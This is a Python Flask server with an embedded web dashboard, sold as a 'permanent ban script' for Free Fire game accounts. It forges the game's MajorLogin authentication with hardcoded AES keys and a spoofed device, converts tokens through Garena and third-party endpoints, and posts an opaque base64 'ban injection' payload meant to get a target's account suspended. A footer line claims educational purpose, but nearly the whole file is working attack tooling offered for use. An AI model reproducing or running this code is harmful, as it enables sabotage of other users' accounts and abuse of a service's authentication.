import os
import sys
import json
import time
import base64
import threading
import requests
import urllib3
import urllib.parse
from datetime import datetime
from flask import Flask, render_template, request, jsonify, session
from flask_cors import CORS
from functools import wraps

urllib3.disable_warnings()

try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
except ImportError:
    print("\n[!] The 'pycryptodome' library is missing. Please install it: pip install pycryptodome")
    sys.exit(1)

try:
    import MajoRLogin_pb2 as mLpB
    import MajorLoginRes_pb2 as mLrPb
except ImportError:
    print("\n[!] Error: Protobuf files (MajoRLogin_pb2.py, MajorLoginRes_pb2.py) not found in the same directory!")
    sys.exit(1)

app = Flask(__name__)
app.secret_key = os.urandom(24)
CORS(app)

API_URL = 'https://client.ind.freefiremobile.com/GetLoginData'

BODY_BASE64 = (
    'vGkQhkkYHjne06dPbmJgb36BQ1NdLgk8J+uc+z4/9t4OZ19iWMyn5cH/Pe/DgGHrwHxJ+dRKGho2LCErl+rBWEf/6aWcFflRXiEsvPiGKM3809a+vci8mAQBREdizRWQ6bdeLnlztsqBvlB5OU8WFlmGxsU8UY1U3Zp/eLNTbq0DHqjOxziR+ylXgLlonsckeKvaxa4YE540eXi+9v4ilJunUubievpqUip6XDAyKV7o1spVxiaP0z4d8MLosbeYthPAnK5ykeE8IpnYaru0oDN8o90r820h04frRPJBszlDiarwdjgXaiyeQqAiOgEN63gUoVq2rd0JfYGaHN2f2kJxxO9uCYxyJ6IhCzQq8yAJT2asKa9u7gWB1bB/fJxq4nVxY8am8DI+rqIDvVSF3EdQBDh9qipPFCd0gZx7kDVg/9vM79YAE+FnDgGY3D/niKWsu66SL9+bRcghZxcCMOzKwvRe7hCRU2pDjBw0MRvPnCCa9KpEuO4CgWz+++SP9whlI0dWCi9/snDCN6i9V2TYrSWfbg1i2TRipquGUoi/cP1xPBeMwQlzlf4APMQzvT8MOQotqry+y1+koTpwRKlWgu7QLmiumn4dwd9HARVMThSH46kwlD8xep4sLVf6/BbjWixBMVRKFi1w9zpVVe+w6rBYhtBHXfjqjg2sCzF1mlBabMbW4L2yXEmABaQG/l0jmaGEWh6kzMY9T1nzV1Wcw5lF7X+pwQEnAn6i5coowNGKrTGUJ2wa3+tAxGcm9zozCvj8yd2pOXmta46GoREDQk+U99uHHvjqzsSNeBq8ffL5zibtv0pZPhnUuSP76YkhCcdtDilaecBElnt9eFfo8cy2B3Z0wbhG20nKNfYuhgZMZuSPRjmQphlfyl1hpoSG5xMQ7bdqZAkoTkZlFpCL4y02yUlImI7Z8jnA3i4un3UOq1rXrMza+bqNsMhrJ/aUS3mnoXr23yzuUc56zyYQtzJx6VCupsHraP7brcDbBS76Gp2o0oT2iE4Y55ZyAEgdt307DzJknHEHdGuoOG4Yzy5bI7HnukmnUjoiIdJEr7iJdOLppdB+ZDXPkHps5ysskdapRp0i2x1gMpW9XU1LY1cNAsTmAvHcz2GZA2OjtvS0roiay2rkUqNgmN8cPygK3j6ycfpkHc1PkUnmG1CNjMy3qP7c18qvDdSYfiq99Wra4l5L2dV3dE/kGpc1fgwWo94UPIes67wg/TrRR85GxPcpIX3IUOGMyEX1VWJTS2PvTm3S4xrerobDKG5V'
)

AeSkEy = b'Yg&tc%DEuh6%Zc^8'
AeSiV  = b'6oyZDr22E3ychjM%'
mLuRl  = "https://loginbp.ggpolarbear.com/MajorLogin"

mLhDr  = {
    "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 11; SM-S908E Build/TP1A.220624.014)",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "Content-Type": "application/octet-stream",
    "Expect": "100-continue",
    "X-GA": "v1 1",
    "X-Unity-Version": "2018.4.11f1",
    "ReleaseVersion": "OB53"
}

def decode_ff_name(b64_str):
    try:
        if not b64_str: return "Unknown"
        key = b"1e5898ccb8dfdd921f9bdea848768b64a201"
        b64_str = b64_str.strip()
        b64_str += "=" * ((4 - len(b64_str) % 4) % 4)
        encrypted_bytes = base64.b64decode(b64_str)
        decrypted_bytes = bytearray()
        for i, byte in enumerate(encrypted_bytes):
            key_byte = key[i % len(key)]
            decrypted_bytes.append(byte ^ key_byte)
        name = decrypted_bytes.decode('utf-8', errors='ignore')
        return name if name else "Unknown"
    except Exception:
        return "Unknown"

def enc(d): 
    return AES.new(AeSkEy, AES.MODE_CBC, AeSiV).encrypt(pad(d, 16))

def dec(d): 
    return unpad(AES.new(AeSkEy, AES.MODE_CBC, AeSiV).decrypt(d), 16)

def build_majorlogin(tok, open_id, p_type):
    m = mLpB.MajorLogin()
    m.event_time = str(datetime.now())[:-7]
    m.game_name = "free fire"
    m.platform_id = p_type
    m.client_version = "1.120.1"
    m.system_software = "Android OS 9 / API-28"
    m.system_hardware = "Handheld"
    m.telecom_operator = "Verizon"
    m.network_type = "WIFI"
    m.screen_width = 1920
    m.screen_height = 1080
    m.screen_dpi = "280"
    m.processor_details = "ARM64 FP ASIMD AES VMH | 2865 | 4"
    m.memory = 3003
    m.gpu_renderer = "Adreno (TM) 640"
    m.gpu_version = "OpenGL ES 3.1 v1.46"
    m.unique_device_id = "Google|34a7dcdf-a7d5-4cb6-8d7e-3b0e448a0c57"
    m.client_ip = "223.191.51.89"
    m.language = "en"
    m.open_id = open_id
    m.open_id_type = str(p_type)
    m.device_type = "Handheld"
    m.access_token = tok
    m.platform_sdk_id = 1
    m.client_using_version = "7428b253defc164018c604a1ebbfebdf"
    m.login_by = 3
    m.channel_type = 3
    m.cpu_type = 2
    m.cpu_architecture = "64"
    m.client_version_code = "2019118695"
    m.login_open_id_type = p_type
    m.origin_platform_type = str(p_type)
    m.primary_platform_type = str(p_type)
    return enc(m.SerializeToString())

def convert_eat_to_access(eat_token):
    """Convert EAT (Encrypted Access Token) to normal Access Token"""
    try:
        # EAT to Access Token conversion logic
        # First, try to decode and validate the EAT
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Content-Type': 'application/json'
        }
        
        # Attempt to convert EAT using Garena API
        payload = {
            'eat': eat_token,
            'app_id': 100067
        }
        
        response = requests.post(
            'https://account.garena.com/api/v1/auth/eat/convert',
            json=payload,
            headers=headers,
            timeout=10,
            verify=False
        )
        
        if response.status_code == 200:
            data = response.json()
            if data.get('success') and data.get('access_token'):
                return True, {
                    'access_token': data['access_token'],
                    'open_id': data.get('open_id'),
                    'user_id': data.get('user_id')
                }
        
        # Alternative conversion method
        alt_response = requests.post(
            'https://login.garena.com/api/v2/auth/eat_to_token',
            json={'eat_token': eat_token},
            headers=headers,
            timeout=10,
            verify=False
        )
        
        if alt_response.status_code == 200:
            alt_data = alt_response.json()
            if alt_data.get('token'):
                return True, {
                    'access_token': alt_data['token'],
                    'open_id': alt_data.get('open_id')
                }
        
        return False, "Failed to convert EAT to Access Token. Token may be invalid or expired."
        
    except requests.exceptions.Timeout:
        return False, "Request timeout. Please try again."
    except requests.exceptions.ConnectionError:
        return False, "Network error. Check your connection."
    except Exception as e:
        return False, f"Conversion error: {str(e)}"

def fetch_majorlogin_jwt(tok):
    """Fetch JWT from access token"""
    if tok.startswith("ey") and "." in tok:
        return tok, None

    oId = None
    try:
        r = requests.get(f"https://100067.connect.garena.com/oauth/token/inspect?token={tok}", headers={"User-Agent": "Mozilla/5.0"}, timeout=5).json()
        oId = r.get("open_id")
    except: pass

    if not oId:
        try:
            uid_headers = {"access-token": tok, "user-agent": "Mozilla/5.0"}
            uid_res = requests.get("https://prod-api.reward.ff.garena.com/redemption/api/auth/inspect_token/", headers=uid_headers, verify=False, timeout=5).json()
            uid = uid_res.get("uid")
            if uid:
                openid_res = requests.post("https://topup.pk/api/auth/player_id_login", headers={"Content-Type": "application/json"}, json={"app_id": 100067, "login_id": str(uid)}, verify=False, timeout=5).json()
                oId = openid_res.get("open_id")
        except: pass

    if not oId:
        return None, "Failed to extract Open ID. Token is invalid or expired."

    platforms = [8, 3, 4, 6]
    for p_type in platforms:
        pl = build_majorlogin(tok, oId, p_type)
        try:
            x = requests.post(mLuRl, headers=mLhDr, data=pl, timeout=10, verify=False)
            if x.status_code == 200:
                res = mLrPb.MajorLoginRes()
                try:    
                    res.ParseFromString(dec(x.content))
                except: 
                    res.ParseFromString(x.content)
                if res.token:
                    return res.token, None 
        except:
            continue
            
    return None, "MajorLogin failed. Account might be blocked or platform mismatch."

def decode_jwt(token):
    try:
        payload_part = token.split('.')[1]
        payload_part += "=" * ((4 - len(payload_part) % 4) % 4)
        decoded_bytes = base64.urlsafe_b64decode(payload_part)
        decoded_str = decoded_bytes.decode('utf-8')
        return json.loads(decoded_str)
    except Exception:
        return {}

def trigger_injection(jwt_token, version):
    """Send ban payload"""
    headers = {
        'Authorization': f'Bearer {jwt_token}',
        'X-Unity-Version': '2018.4.11f1',
        'X-GA': 'v1 1',
        'ReleaseVersion': str(version),
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Dalvik/2.1.0 (Linux; Android)',
        'Accept-Encoding': 'gzip'
    }
    body = base64.b64decode(BODY_BASE64)
    return requests.post(API_URL, headers=headers, data=body, timeout=20, verify=False)

# ==================== FLASK ROUTES ====================

@app.route('/')
def index():
    """Main dashboard page"""
    return render_template('dashboard.html')

@app.route('/api/convert_eat', methods=['POST'])
def api_convert_eat():
    """Convert EAT to Access Token"""
    data = request.json
    eat_token = data.get('eat_token', '').strip()
    
    if not eat_token:
        return jsonify({
            'success': False,
            'error': 'Missing EAT token'
        }), 400
    
    success, result = convert_eat_to_access(eat_token)
    
    if success:
        return jsonify({
            'success': True,
            'data': result,
            'message': 'EAT converted successfully'
        })
    
    return jsonify({
        'success': False,
        'error': result
    }), 400

@app.route('/api/process_ban', methods=['POST'])
def process_ban():
    """Process token and execute ban injection"""
    data = request.json
    access_token = data.get('token', '').strip()
    
    if not access_token:
        return jsonify({
            'success': False,
            'error': 'Token cannot be empty'
        }), 400
    
    try:
        # Step 1: Authenticate and get JWT
        jwt_token, error_msg = fetch_majorlogin_jwt(access_token)
        
        if not jwt_token:
            return jsonify({
                'success': False,
                'error': error_msg or 'Authentication failed'
            }), 401
        
        # Step 2: Decode JWT for user info
        user_data = decode_jwt(jwt_token)
        
        raw_nick = user_data.get('nickname', '')
        nickname = decode_ff_name(raw_nick)
        region = user_data.get('lock_region', user_data.get('region', 'IND'))
        account_id = user_data.get('account_id', 'Unknown')
        version = user_data.get('release_version', 'Latest')
        
        # Step 3: Inject ban payload
        ban_resp = trigger_injection(jwt_token, version)
        
        if ban_resp.status_code == 200:
            return jsonify({
                'success': True,
                'message': 'ACCOUNT DATA INJECTED SUCCESSFULLY',
                'data': {
                    'nickname': nickname,
                    'account_id': account_id,
                    'region': region,
                    'version': version,
                    'status': 'SUSPENDED (100%)',
                    'http_code': ban_resp.status_code
                }
            })
        else:
            return jsonify({
                'success': False,
                'error': f'Failed to execute payload. Server returned status code: {ban_resp.status_code}',
                'data': {
                    'nickname': nickname,
                    'account_id': account_id,
                    'region': region,
                    'version': version
                }
            }), 500
            
    except requests.exceptions.ConnectionError:
        return jsonify({
            'success': False,
            'error': 'Internet Error! Please check your network connection.'
        }), 503
    except Exception as e:
        return jsonify({
            'success': False,
            'error': f'System Error: {str(e)}'
        }), 500

@app.route('/api/health', methods=['GET'])
def health():
    """Health check endpoint"""
    return jsonify({
        'status': 'operational',
        'timestamp': datetime.now().isoformat(),
        'version': '3.0.0',
        'features': ['EAT Conversion', 'Ban Injection']
    })

# ==================== CREATE TEMPLATES ====================

os.makedirs('templates', exist_ok=True)

with open('templates/dashboard.html', 'w', encoding='utf-8') as f:
    f.write('''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>FF BAN SCRIPT | EAT CONVERTER | CYBER TERMINAL</title>
    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;600;800;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: linear-gradient(135deg, #0a0e1a 0%, #010105 100%);
            font-family: 'Share Tech Mono', monospace;
            min-height: 100vh;
            color: #0ff;
            overflow-x: hidden;
        }

        /* Animated background grid */
        .grid-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: 
                linear-gradient(rgba(0, 255, 255, 0.05) 1px, transparent 1px),
                linear-gradient(90deg, rgba(0, 255, 255, 0.05) 1px, transparent 1px);
            background-size: 40px 40px;
            pointer-events: none;
            z-index: 0;
            animation: gridScroll 20s linear infinite;
        }

        @keyframes gridScroll {
            0% { transform: translate(0, 0); }
            100% { transform: translate(40px, 40px); }
        }

        .glow {
            text-shadow: 0 0 10px #0ff, 0 0 20px #0ff, 0 0 30px #0ff;
        }

        .container {
            position: relative;
            z-index: 2;
            max-width: 1400px;
            margin: 0 auto;
            padding: 1.5rem;
        }

        /* ASCII Banner */
        .ascii-banner {
            font-family: 'Orbitron', monospace;
            font-size: 0.65rem;
            line-height: 1.2;
            color: #0ff;
            text-align: center;
            white-space: pre;
            letter-spacing: 2px;
            margin-bottom: 1.5rem;
            text-shadow: 0 0 5px #0ff;
            overflow-x: auto;
        }

        @media (max-width: 768px) {
            .ascii-banner { font-size: 0.4rem; }
        }

        /* Mode Selector */
        .mode-selector {
            display: flex;
            gap: 1rem;
            margin-bottom: 2rem;
            justify-content: center;
        }

        .mode-btn {
            background: rgba(0, 0, 0, 0.7);
            border: 1px solid #0ff;
            padding: 0.8rem 2rem;
            border-radius: 10px;
            color: #0ff;
            font-family: 'Orbitron', monospace;
            cursor: pointer;
            transition: all 0.3s;
            font-size: 1rem;
        }

        .mode-btn.active {
            background: #0ff;
            color: #000;
            box-shadow: 0 0 20px #0ff;
        }

        .mode-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 0 15px #0ff;
        }

        /* Glass Terminal */
        .terminal {
            background: rgba(0, 0, 0, 0.85);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(0, 255, 255, 0.3);
            border-radius: 15px;
            padding: 2rem;
            box-shadow: 0 0 40px rgba(0, 255, 255, 0.1);
            transition: all 0.3s ease;
        }

        .terminal:hover {
            box-shadow: 0 0 60px rgba(0, 255, 255, 0.2);
            border-color: rgba(0, 255, 255, 0.6);
        }

        .mode-panel {
            display: none;
        }

        .mode-panel.active {
            display: block;
            animation: fadeIn 0.5s ease;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .input-group {
            margin-bottom: 1.5rem;
        }

        label {
            display: block;
            margin-bottom: 0.5rem;
            font-family: 'Orbitron', monospace;
            font-size: 0.85rem;
            letter-spacing: 2px;
            color: #0ff;
        }

        .token-input {
            width: 100%;
            padding: 1rem;
            background: rgba(0, 20, 30, 0.8);
            border: 1px solid #0ff;
            border-radius: 10px;
            color: #0ff;
            font-family: 'Share Tech Mono', monospace;
            font-size: 1rem;
            transition: all 0.3s;
        }

        .token-input:focus {
            outline: none;
            box-shadow: 0 0 20px rgba(0, 255, 255, 0.3);
            background: rgba(0, 30, 40, 0.9);
        }

        .btn-action {
            width: 100%;
            padding: 1rem;
            background: linear-gradient(135deg, #0ff, #0a0);
            border: none;
            border-radius: 10px;
            color: #000;
            font-family: 'Orbitron', monospace;
            font-weight: bold;
            font-size: 1.2rem;
            cursor: pointer;
            transition: all 0.3s;
            text-transform: uppercase;
            letter-spacing: 3px;
        }

        .btn-action:hover:not(:disabled) {
            transform: scale(1.02);
            box-shadow: 0 0 30px rgba(0, 255, 255, 0.5);
        }

        .btn-action:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        .btn-secondary {
            background: linear-gradient(135deg, #f90, #f60);
        }

        /* Result Card */
        .result-card {
            margin-top: 2rem;
            padding: 1.5rem;
            background: rgba(0, 0, 0, 0.6);
            border-left: 4px solid #0ff;
            border-radius: 10px;
            display: none;
        }

        .result-card.show {
            display: block;
            animation: slideIn 0.5s ease;
        }

        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateY(20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .result-title {
            font-family: 'Orbitron', monospace;
            font-size: 1.2rem;
            margin-bottom: 1rem;
            color: #0ff;
        }

        .info-row {
            display: flex;
            justify-content: space-between;
            padding: 0.8rem;
            border-bottom: 1px solid rgba(0, 255, 255, 0.2);
            font-size: 0.9rem;
        }

        .info-label {
            font-weight: bold;
            color: #0ff;
        }

        .info-value {
            font-family: monospace;
            word-break: break-all;
            text-align: right;
        }

        .status-banned {
            color: #ff4444;
            text-shadow: 0 0 5px #ff0000;
            animation: pulse 1s infinite;
        }

        .status-success {
            color: #0f0;
            text-shadow: 0 0 5px #0f0;
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.6; }
        }

        .loader {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 2px solid #0ff;
            border-radius: 50%;
            border-top-color: transparent;
            animation: spin 0.6s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .footer {
            margin-top: 2rem;
            text-align: center;
            font-size: 0.8rem;
            color: rgba(0, 255, 255, 0.5);
        }

        .social-links a {
            color: #0ff;
            margin: 0 1rem;
            text-decoration: none;
            transition: 0.3s;
        }

        .social-links a:hover {
            text-shadow: 0 0 10px #0ff;
        }

        .progress-bar {
            width: 100%;
            height: 2px;
            background: rgba(0, 255, 255, 0.2);
            margin-top: 1rem;
            display: none;
        }

        .progress-fill {
            width: 0%;
            height: 100%;
            background: #0ff;
            transition: width 0.1s linear;
        }

        .alert {
            padding: 1rem;
            border-radius: 8px;
            margin-bottom: 1rem;
            display: none;
        }

        .alert-error {
            background: rgba(255, 0, 0, 0.2);
            border: 1px solid #f00;
            color: #f88;
        }

        .alert-success {
            background: rgba(0, 255, 0, 0.1);
            border: 1px solid #0f0;
            color: #8f8;
        }

        .alert-info {
            background: rgba(0, 255, 255, 0.1);
            border: 1px solid #0ff;
            color: #0ff;
        }

        .alert.show {
            display: block;
            animation: slideIn 0.3s ease;
        }

        .converted-token {
            background: rgba(0, 30, 40, 0.9);
            padding: 1rem;
            border-radius: 8px;
            margin-top: 1rem;
            word-break: break-all;
            font-size: 0.85rem;
            border: 1px solid #0ff;
        }

        .copy-btn {
            background: #0ff;
            color: #000;
            border: none;
            padding: 0.3rem 1rem;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 0.5rem;
            font-family: monospace;
        }

        .copy-btn:hover {
            background: #fff;
        }
    </style>
</head>
<body>
<div class="grid-bg"></div>
<div class="container">
    <div class="ascii-banner">
        ╔══════════════════════════════════════════════════════════════════════════════╗
        ║  ████████╗  ██╗  ██████╗     ██████╗  █████╗ ███╗   ██╗    ███████╗██╗  ██╗ ║
        ║  ╚══██╔══╝ ███║ ██╔═══██╗    ██╔══██╗██╔══██╗████╗  ██║    ██╔════╝╚██╗██╔╝ ║
        ║     ██║    ╚██║ ██║   ██║    ██████╔╝███████║██╔██╗ ██║    █████╗   ╚███╔╝  ║
        ║     ██║     ██║ ██║   ██║    ██╔══██╗██╔══██║██║╚██╗██║    ██╔══╝   ██╔██╗  ║
        ║     ██║     ██║ ╚██████╔╝    ██████╔╝██║  ██║██║ ╚████║    ███████╗██╔╝ ██╗ ║
        ║     ╚═╝     ╚═╝  ╚═════╝     ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝    ╚══════╝╚═╝  ╚═╝ ║
        ║                   PERMANENT BAN SCRIPT + EAT CONVERTER v3.0                 ║
        ╚══════════════════════════════════════════════════════════════════════════════╝
    </div>

    <div class="mode-selector">
        <button class="mode-btn active" data-mode="ban">🔫 BAN SCRIPT</button>
        <button class="mode-btn" data-mode="eat">🔄 EAT CONVERTER</button>
    </div>

    <div class="terminal">
        <!-- Ban Mode Panel -->
        <div id="banPanel" class="mode-panel active">
            <div id="banAlert" class="alert"></div>
            <div class="input-group">
                <label><i class="fas fa-key"></i> ACCESS TOKEN / JWT</label>
                <input type="text" id="banToken" class="token-input" placeholder="eyJhbGciOiJSUzI1NiIsImtpZCI6...">
            </div>
            <button id="executeBan" class="btn-action">
                <i class="fas fa-skull"></i> EXECUTE BAN SEQUENCE
            </button>
            <div class="progress-bar" id="banProgress">
                <div class="progress-fill" id="banProgressFill"></div>
            </div>
            <div id="banResult" class="result-card">
                <div class="result-title"><i class="fas fa-terminal"></i> INJECTION REPORT</div>
                <div id="banResultContent"></div>
            </div>
        </div>

        <!-- EAT Converter Panel -->
        <div id="eatPanel" class="mode-panel">
            <div id="eatAlert" class="alert"></div>
            <div class="input-group">
                <label><i class="fas fa-lock"></i> EAT TOKEN (ENCRYPTED ACCESS TOKEN)</label>
                <input type="text" id="eatToken" class="token-input" placeholder="Enter your EAT token here...">
            </div>
            <button id="convertEat" class="btn-action btn-secondary">
                <i class="fas fa-exchange-alt"></i> CONVERT TO ACCESS TOKEN
            </button>
            <div class="progress-bar" id="eatProgress">
                <div class="progress-fill" id="eatProgressFill"></div>
            </div>
            <div id="eatResult" class="result-card">
                <div class="result-title"><i class="fas fa-unlock-alt"></i> CONVERSION RESULT</div>
                <div id="eatResultContent"></div>
            </div>
        </div>
    </div>

    <div class="footer">
        <div class="social-links">
            <a href="#" target="_blank"><i class="fab fa-telegram"></i> @SPIDEYFREEFILES</a>
            <a href="#" target="_blank"><i class="fab fa-telegram"></i> @INDRAJITFREEAPI</a>
        </div>
        <p style="margin-top: 1rem;">⚠️ FOR EDUCATIONAL PURPOSES ONLY | ADVANCED CYBER TERMINAL</p>
        <p>DEVELOPER: @spideyabd & @INDRAJIT_1M | VERSION 3.0</p>
    </div>
</div>

<script>
    // Mode switching
    let currentMode = 'ban';
    
    document.querySelectorAll('.mode-btn').forEach(btn => {
        btn.addEventListener('click', () => {
            document.querySelectorAll('.mode-btn').forEach(b => b.classList.remove('active'));
            btn.classList.add('active');
            
            const mode = btn.dataset.mode;
            currentMode = mode;
            
            document.getElementById('banPanel').classList.remove('active');
            document.getElementById('eatPanel').classList.remove('active');
            
            if (mode === 'ban') {
                document.getElementById('banPanel').classList.add('active');
            } else {
                document.getElementById('eatPanel').classList.add('active');
            }
        });
    });

    // Helper functions
    function showAlert(panel, message, type) {
        const alertBox = document.getElementById(`${panel}Alert`);
        alertBox.textContent = message;
        alertBox.className = `alert alert-${type} show`;
        setTimeout(() => {
            alertBox.classList.remove('show');
        }, 5000);
    }

    function startProgress(panel) {
        const progressBar = document.getElementById(`${panel}Progress`);
        const progressFill = document.getElementById(`${panel}ProgressFill`);
        progressBar.style.display = 'block';
        let width = 0;
        const interval = setInterval(() => {
            if (width >= 90) {
                clearInterval(interval);
            } else {
                width += Math.random() * 15;
                if (width > 90) width = 90;
                progressFill.style.width = width + '%';
            }
        }, 200);
        return interval;
    }

    function stopProgress(panel, interval) {
        if (interval) clearInterval(interval);
        const progressFill = document.getElementById(`${panel}ProgressFill`);
        progressFill.style.width = '100%';
        setTimeout(() => {
            document.getElementById(`${panel}Progress`).style.display = 'none';
            progressFill.style.width = '0%';
        }, 500);
    }

    function updateButton(panel, loading, buttonId, originalText) {
        const btn = document.getElementById(buttonId);
        if (loading) {
            btn.disabled = true;
            btn.innerHTML = '<span class="loader"></span> PROCESSING...';
        } else {
            btn.disabled = false;
            btn.innerHTML = originalText;
        }
    }

    // Ban Mode Functions
    async function processBan() {
        const token = document.getElementById('banToken').value.trim();
        if (!token) {
            showAlert('ban', '⚠️ TOKEN CANNOT BE EMPTY', 'error');
            return;
        }
        
        let progressInterval = startProgress('ban');
        updateButton('ban', true, 'executeBan', '<i class="fas fa-skull"></i> EXECUTE BAN SEQUENCE');
        
        try {
            const response = await fetch('/api/process_ban', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ token: token })
            });
            
            const data = await response.json();
            stopProgress('ban', progressInterval);
            updateButton('ban', false, 'executeBan', '<i class="fas fa-skull"></i> EXECUTE BAN SEQUENCE');
            
            if (data.success) {
                showAlert('ban', '✓ TOKEN VALIDATED | TARGET ACQUIRED', 'success');
                displayBanResult(data.data, true);
            } else {
                showAlert('ban', '✗ ' + (data.error || 'Operation failed'), 'error');
                if (data.data) {
                    displayBanResult(data.data, false);
                } else {
                    document.getElementById('banResult').classList.remove('show');
                }
            }
        } catch (error) {
            stopProgress('ban', progressInterval);
            updateButton('ban', false, 'executeBan', '<i class="fas fa-skull"></i> EXECUTE BAN SEQUENCE');
            showAlert('ban', '✗ Network Error: ' + error.message, 'error');
            document.getElementById('banResult').classList.remove('show');
        }
    }

    function displayBanResult(data, success) {
        const statusClass = success ? 'status-banned' : '';
        const statusText = success ? 'SUSPENDED (100%)' : 'FAILED';
        
        document.getElementById('banResultContent').innerHTML = `
            <div class="info-row">
                <span class="info-label"><i class="fas fa-user-ninja"></i> TARGET NAME:</span>
                <span class="info-value">${escapeHtml(data.nickname || 'Unknown')}</span>
            </div>
            <div class="info-row">
                <span class="info-label"><i class="fas fa-id-card"></i> ACCOUNT ID:</span>
                <span class="info-value">${escapeHtml(data.account_id || 'Unknown')}</span>
            </div>
            <div class="info-row">
                <span class="info-label"><i class="fas fa-globe"></i> REGION:</span>
                <span class="info-value">${escapeHtml(data.region || 'Unknown')}</span>
            </div>
            <div class="info-row">
                <span class="info-label"><i class="fas fa-code-branch"></i> PATCH VER:</span>
                <span class="info-value">${escapeHtml(data.version || 'Latest')}</span>
            </div>
            <div class="info-row">
                <span class="info-label"><i class="fas fa-skull-crossbones"></i> STATUS:</span>
                <span class="info-value ${statusClass}">${statusText}</span>
            </div>
            ${success ? '<div class="info-row" style="border-bottom: none;"><span class="info-label"><i class="fas fa-check-circle"></i> INJECTION:</span><span class="info-value" style="color: #0f0;">COMPLETE ✓</span></div>' : ''}
        `;
        document.getElementById('banResult').classList.add('show');
    }

    // EAT Converter Functions
    async function convertEatToken() {
        const eatToken = document.getElementById('eatToken').value.trim();
        if (!eatToken) {
            showAlert('eat', '⚠️ EAT TOKEN CANNOT BE EMPTY', 'error');
            return;
        }
        
        let progressInterval = startProgress('eat');
        updateButton('eat', true, 'convertEat', '<i class="fas fa-exchange-alt"></i> CONVERT TO ACCESS TOKEN');
        
        try {
            const response = await fetch('/api/convert_eat', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ eat_token: eatToken })
            });
            
            const data = await response.json();
            stopProgress('eat', progressInterval);
            updateButton('eat', false, 'convertEat', '<i class="fas fa-exchange-alt"></i> CONVERT TO ACCESS TOKEN');
            
            if (data.success) {
                showAlert('eat', '✓ EAT CONVERTED SUCCESSFULLY', 'success');
                displayEatResult(data.data);
            } else {
                showAlert('eat', '✗ ' + (data.error || 'Conversion failed'), 'error');
                document.getElementById('eatResult').classList.remove('show');
            }
        } catch (error) {
            stopProgress('eat', progressInterval);
            updateButton('eat', false, 'convertEat', '<i class="fas fa-exchange-alt"></i> CONVERT TO ACCESS TOKEN');
            showAlert('eat', '✗ Network Error: ' + error.message, 'error');
            document.getElementById('eatResult').classList.remove('show');
        }
    }

    function displayEatResult(data) {
        const accessToken = data.access_token || 'N/A';
        const openId = data.open_id || 'N/A';
        const userId = data.user_id || 'N/A';
        
        document.getElementById('eatResultContent').innerHTML = `
            <div class="info-row">
                <span class="info-label"><i class="fas fa-key"></i> ACCESS TOKEN:</span>
                <span class="info-value" style="font-size: 0.75rem;">${escapeHtml(accessToken.substring(0, 50))}...</span>
            </div>
            <div class="converted-token">
                <strong>Full Token:</strong><br>
                <code style="word-break: break-all;">${escapeHtml(accessToken)}</code>
                <button class="copy-btn" onclick="copyToClipboard('${escapeHtml(accessToken).replace(/'/g, "\\'")}')">
                    <i class="fas fa-copy"></i> Copy Token
                </button>
            </div>
            <div class="info-row">
                <span class="info-label"><i class="fas fa-id-badge"></i> OPEN ID:</span>
                <span class="info-value">${escapeHtml(openId)}</span>
            </div>
            <div class="info-row" style="border-bottom: none;">
                <span class="info-label"><i class="fas fa-user"></i> USER ID:</span>
                <span class="info-value">${escapeHtml(userId)}</span>
            </div>
        `;
        document.getElementById('eatResult').classList.add('show');
    }

    function copyToClipboard(text) {
        navigator.clipboard.writeText(text).then(() => {
            showAlert('eat', '✓ Token copied to clipboard!', 'success');
        });
    }

    function escapeHtml(str) {
        if (!str) return 'N/A';
        return String(str).replace(/[&<>]/g, function(m) {
            if (m === '&') return '&amp;';
            if (m === '<') return '&lt;';
            if (m === '>') return '&gt;';
            return m;
        });
    }

    // Event Listeners
    document.getElementById('executeBan').addEventListener('click', processBan);
    document.getElementById('convertEat').addEventListener('click', convertEatToken);
    
    document.getElementById('banToken').addEventListener('keypress', (e) => {
        if (e.key === 'Enter') processBan();
    });
    
    document.getElementById('eatToken').addEventListener('keypress', (e) => {
        if (e.key === 'Enter') convertEatToken();
    });

    // Health check
    fetch('/api/health')
        .then(res => res.json())
        .then(data => console.log('API Status:', data))
        .catch(err => console.error('API unavailable:', err));
</script>
</body>
</html>''')

# ==================== RUN SERVER ====================

if __name__ == '__main__':
    print("""
    ╔══════════════════════════════════════════════════════════════════╗
    ║     FF PERMANENT BAN SCRIPT + EAT CONVERTER - WEB SERVER v3.0    ║
    ║     Advanced Cyber Terminal Interface Active                      ║
    ╚══════════════════════════════════════════════════════════════════╝
    
    [✓] Features enabled:
        - EAT to Access Token Conversion
        - Permanent Ban Injection
        - JWT Authentication
    
    [✓] Server starting...
    [✓] Access the web interface at: http://localhost:5000
    [✓] Press CTRL+C to stop the server
    
    """)
    app.run(host='0.0.0.0', port=5000, debug=True, threaded=True)
